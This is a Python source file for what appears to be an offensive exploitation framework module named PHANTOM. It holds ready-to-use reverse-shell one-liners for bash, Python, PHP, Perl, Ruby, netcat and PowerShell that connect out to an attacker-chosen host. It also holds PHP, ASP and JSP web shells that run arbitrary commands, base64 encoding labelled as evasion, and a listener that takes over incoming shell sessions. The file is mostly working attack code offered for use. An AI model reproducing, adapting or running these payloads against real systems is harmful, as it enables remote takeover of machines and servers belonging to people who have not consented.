#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
PHANTOM Exploit Framework Module

Automated exploitation engine with payload generation,
shell handling, and post-exploitation capabilities.
"""

import os
import socket
import subprocess
import base64
from typing import Dict, Any, List, Optional
from dataclasses import dataclass, field
from enum import Enum
from datetime import datetime


class ExploitCategory(Enum):
    """Exploit categories"""
    REMOTE = "remote"
    LOCAL = "local"
    WEB = "web"
    WIRELESS = "wireless"
    SOCIAL = "social"


class PayloadType(Enum):
    """Payload types"""
    REVERSE_SHELL = "reverse_shell"
    BIND_SHELL = "bind_shell"
    METERPRETER = "meterpreter"
    WEB_SHELL = "web_shell"
    COMMAND_EXEC = "command_exec"


@dataclass
class Exploit:
    """Exploit information container"""
    name: str
    category: ExploitCategory
    description: str
    cve: str = ""
    targets: List[str] = field(default_factory=list)
    options: Dict[str, Any] = field(default_factory=dict)
    payload: str = ""


@dataclass
class Payload:
    """Payload container"""
    name: str
    payload_type: PayloadType
    platform: str
    architecture: str
    code: str
    encoded: bool = False


class PayloadGenerator:
    """Generate various payloads for exploitation"""
    
    SHELL_TEMPLATES = {
        'bash': "bash -i >& /dev/tcp/{host}/{port} 0>&1",
        'python': "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{host}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
        'python3': "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{host}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
        'php': "php -r '$sock=fsockopen(\"{host}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
        'perl': "perl -e 'use Socket;$i=\"{host}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'",
        'ruby': "ruby -rsocket -e'f=TCPSocket.open(\"{host}\",{port}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
        'nc': "nc -e /bin/sh {host} {port}",
        'powershell': "$client = New-Object System.Net.Sockets.TCPClient('{host}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"
    }
    
    WEB_SHELLS = {
        'php_simple': "<?php system($_GET['cmd']); ?>",
        'php_eval': "<?php @eval($_POST['cmd']); ?>",
        'php_passthru': "<?php passthru($_REQUEST['cmd']); ?>",
        'asp_exec': '<%@ Language=VBScript %><%Dim oS:Set oS=Server.CreateObject("WSCRIPT.SHELL"):Dim oSR:Set oSR=oS.Exec(Request("cmd")):Dim sOut:sOut=oSR.StdOut.ReadAll%><%=sOut%>',
        'jsp_exec': '<%@ page import="java.util.*,java.io.*"%><%Process p=Runtime.getRuntime().exec(request.getParameter("cmd"));BufferedReader in=new BufferedReader(new InputStreamReader(p.getInputStream()));String s="";while((s=in.readLine())!=null){out.println(s);}%>'
    }
    
    def generate_reverse_shell(self, host: str, port: int, shell_type: str = "bash") -> Payload:
        """Generate reverse shell payload"""
        template = self.SHELL_TEMPLATES.get(shell_type, self.SHELL_TEMPLATES['bash'])
        code = template.format(host=host, port=port)
        
        return Payload(
            name=f"reverse_shell_{shell_type}",
            payload_type=PayloadType.REVERSE_SHELL,
            platform="linux" if shell_type != "powershell" else "windows",
            architecture="x64",
            code=code
        )
    
    def generate_web_shell(self, shell_type: str = "php_simple") -> Payload:
        """Generate web shell payload"""
        code = self.WEB_SHELLS.get(shell_type, self.WEB_SHELLS['php_simple'])
        
        return Payload(
            name=f"web_shell_{shell_type}",
            payload_type=PayloadType.WEB_SHELL,
            platform="web",
            architecture="any",
            code=code
        )
    
    def encode_payload(self, payload: Payload, encoding: str = "base64") -> Payload:
        """Encode payload for evasion"""
        if encoding == "base64":
            payload.code = base64.b64encode(payload.code.encode()).decode()
            payload.encoded = True
        return payload
    
    def list_available_shells(self) -> Dict[str, List[str]]:
        """List available shell types"""
        return {
            'reverse_shells': list(self.SHELL_TEMPLATES.keys()),
            'web_shells': list(self.WEB_SHELLS.keys())
        }


class ShellHandler:
    """Handle reverse/bind shell connections"""
    
    def __init__(self):
        self.active_sessions: Dict[str, socket.socket] = {}
    
    def start_listener(self, host: str = "0.0.0.0", port: int = 4444) -> bool:
        """Start a listener for reverse shells"""
        try:
            server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            server.bind((host, port))
            server.listen(5)
            
            print(f"[*] Listening on {host}:{port}")
            
            client, addr = server.accept()
            session_id = f"{addr[0]}:{addr[1]}"
            self.active_sessions[session_id] = client
            
            print(f"[+] Connection from {session_id}")
            return True
            
        except Exception as e:
            print(f"[-] Error starting listener: {e}")
            return False
    
    def send_command(self, session_id: str, command: str) -> str:
        """Send command to active session"""
        if session_id not in self.active_sessions:
            return "Session not found"
        
        try:
            conn = self.active_sessions[session_id]
            conn.send(f"{command}\n".encode())
            return conn.recv(4096).decode()
        except Exception as e:
            return f"Error: {e}"
    
    def close_session(self, session_id: str):
        """Close an active session"""
        if session_id in self.active_sessions:
            try:
                self.active_sessions[session_id].close()
            except Exception:
                pass
            del self.active_sessions[session_id]
    
    def list_sessions(self) -> List[str]:
        """List active sessions"""
        return list(self.active_sessions.keys())


class VulnerabilityScanner:
    """Scan for common vulnerabilities"""
    
    VULN_CHECKS = {
        'ssh_version': {
            'port': 22,
            'check': 'SSH',
            'description': 'SSH Version Check'
        },
        'ftp_anonymous': {
            'port': 21,
            'check': 'anonymous',
            'description': 'FTP Anonymous Login'
        },
        'http_methods': {
            'port': 80,
            'check': 'OPTIONS',
            'description': 'HTTP Methods Enumeration'
        }
    }
    
    def scan_target(self, target: str) -> Dict[str, Any]:
        """Scan target for vulnerabilities"""
        results = {
            'target': target,
            'vulnerabilities': [],
            'scan_time': datetime.now().isoformat()
        }
        
        for vuln_name, vuln_info in self.VULN_CHECKS.items():
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(3)
                result = sock.connect_ex((target, vuln_info['port']))
                
                if result == 0:
                    # Port is open, perform check
                    results['vulnerabilities'].append({
                        'name': vuln_name,
                        'port': vuln_info['port'],
                        'description': vuln_info['description'],
                        'status': 'open'
                    })
                
                sock.close()
            except Exception:
                continue
        
        return results


class ExploitFramework:
    """
    Master Exploit Framework Module
    
    Provides:
    - Payload generation
    - Shell handling
    - Vulnerability scanning
    - Exploit management
    """
    
    def __init__(self):
        self.payload_gen = PayloadGenerator()
        self.shell_handler = ShellHandler()
        self.vuln_scanner = VulnerabilityScanner()
        self.exploits: List[Exploit] = []
    
    def generate_payload(self, payload_type: str, host: str, port: int, **kwargs) -> Payload:
        """Generate a payload"""
        if payload_type in self.payload_gen.SHELL_TEMPLATES:
            return self.payload_gen.generate_reverse_shell(host, port, payload_type)
        elif payload_type in self.payload_gen.WEB_SHELLS:
            return self.payload_gen.generate_web_shell(payload_type)
        else:
            return self.payload_gen.generate_reverse_shell(host, port, "bash")
    
    def start_handler(self, host: str = "0.0.0.0", port: int = 4444) -> bool:
        """Start shell handler"""
        return self.shell_handler.start_listener(host, port)
    
    def scan_vulnerabilities(self, target: str) -> Dict[str, Any]:
        """Scan target for vulnerabilities"""
        return self.vuln_scanner.scan_target(target)
    
    def list_payloads(self) -> Dict[str, List[str]]:
        """List available payloads"""
        return self.payload_gen.list_available_shells()
    
    def get_active_sessions(self) -> List[str]:
        """Get active shell sessions"""
        return self.shell_handler.list_sessions()
